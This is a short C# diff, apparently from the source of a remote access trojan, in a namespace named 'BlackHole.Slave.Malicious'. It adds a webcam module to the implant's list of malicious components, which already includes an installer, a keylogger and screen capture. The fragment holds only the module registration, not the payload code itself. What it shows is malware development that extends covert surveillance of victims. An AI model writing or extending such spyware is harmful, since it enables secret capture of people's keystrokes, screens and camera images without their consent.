@@ -22,7 +22,8 @@ namespace BlackHole.Slave.Malicious
             {
                 Installer.Instance,
                 Keylogger.Instance,
-                ScreenCapture.Instance
+                ScreenCapture.Instance,
+                Webcam.Instance
             };
         }
 
